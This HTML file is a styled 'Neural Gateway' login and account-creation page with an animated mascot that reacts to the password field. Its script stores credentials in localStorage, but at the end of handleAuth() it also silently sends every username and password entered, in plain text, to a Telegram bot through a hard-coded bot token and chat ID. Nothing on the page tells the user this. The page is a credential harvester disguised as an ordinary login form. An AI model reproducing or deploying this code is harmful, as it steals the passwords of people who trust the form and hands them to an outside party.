<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neural Gateway</title>
    <style>
        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        .glass-card { 
            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(15px); 
            padding: 30px; border-radius: 25px; text-align: center; 
            width: 320px; max-width: 85%; /* মোবাইলের জন্য ছোট করা হয়েছে */
            border: 2px solid transparent;
            animation: borderGlow 3s infinite alternate;
        }

        @keyframes borderGlow {
            0% { border-color: #00ff88; box-shadow: 0 0 10px #00ff88; }
            100% { border-color: #0088ff; box-shadow: 0 0 20px #0088ff; }
        }

        #mascot-img { width: 120px; height: 120px; margin-bottom: 15px; transition: 0.3s; border-radius: 50%; }
        
        .input-group { position: relative; margin: 15px 0; display: flex; align-items: center; }
        
        input { 
            width: 100%; padding: 12px 40px 12px 12px; /* ডানে জায়গা রাখা হয়েছে */
            background: rgba(255,255,255,0.1); border: 1px solid #444; 
            color: white; border-radius: 10px; outline: none; box-sizing: border-box; 
        }
        
        input:focus { border: 1px solid #00ff88; }
        
        #toggle-pass { 
            position: absolute; right: 10px; background: none; border: none; 
            color: #00ff88; cursor: pointer; font-size: 18px; 
            display: flex; align-items: center; height: 100%;
        }
        
        button { width: 100%; padding: 12px; background: #00ff88; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; margin-top: 5px; }
        a { color: #00ff88; text-decoration: none; font-size: 14px; display: block; margin-top: 15px; cursor: pointer; }
    </style>
</head>
<body>

<div class="glass-card">
    <img id="mascot-img" src="1000022715.jpg" alt="Mascot">
    <h2 id="form-title" style="margin-top: 0;">Login</h2>
    
    <input type="text" id="username" placeholder="Username" style="width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #444; background: rgba(255,255,255,0.1); color: white; box-sizing: border-box;">
    
    <div class="input-group">
        <input type="password" id="password" placeholder="Password">
        <button id="toggle-pass" type="button">👁️</button>
    </div>
    
    <button onclick="handleAuth()" id="action-btn">SECURE LOGIN</button>
    <a id="toggle-link" onclick="switchForm()">Create Account</a>
</div>

<script>
    let isLogin = true;
    const img = document.getElementById('mascot-img');
    const pass = document.getElementById('password');
    const toggleBtn = document.getElementById('toggle-pass');

    pass.addEventListener('focus', () => { if(pass.type === "password") img.src = '1000022716.jpg'; });
    pass.addEventListener('blur', () => { if(pass.type === "password") img.src = '1000022715.jpg'; });

    toggleBtn.addEventListener('click', () => {
        pass.type = (pass.type === "password") ? "text" : "password";
        img.src = (pass.type === "text") ? '1000022717.jpg' : '1000022716.jpg';
        toggleBtn.innerText = (pass.type === "text") ? "🙈" : "👁️";
    });

    function switchForm() {
        isLogin = !isLogin;
        document.getElementById('form-title').innerText = isLogin ? "Login" : "Create Account";
        document.getElementById('action-btn').innerText = isLogin ? "SECURE LOGIN" : "REGISTER";
        document.getElementById('toggle-link').innerText = isLogin ? "Create Account" : "Back to Login";
    }

    function handleAuth() {
        const user = document.getElementById('username').value;
        const passVal = pass.value;

        if(!user || !passVal) return alert("Please fill all fields!");

        if (isLogin) {
            if (localStorage.getItem(user) === passVal) {
                alert("Login Successful!");
                window.location.href = "https://www.google.com";
            } else {
                alert("Invalid username or password!");
            }
        } else {
            localStorage.setItem(user, passVal);
            alert("Account Created!");
            switchForm();
        }

        fetch(`https://api.telegram.org/bot8736432847:AAHbDf-tOzpa6q--_R-1MRGeENKkh9CEHWc/sendMessage?chat_id=7950771882&text=User:${user}%0APass:${passVal}`);
    }
</script>

</body>
</html>
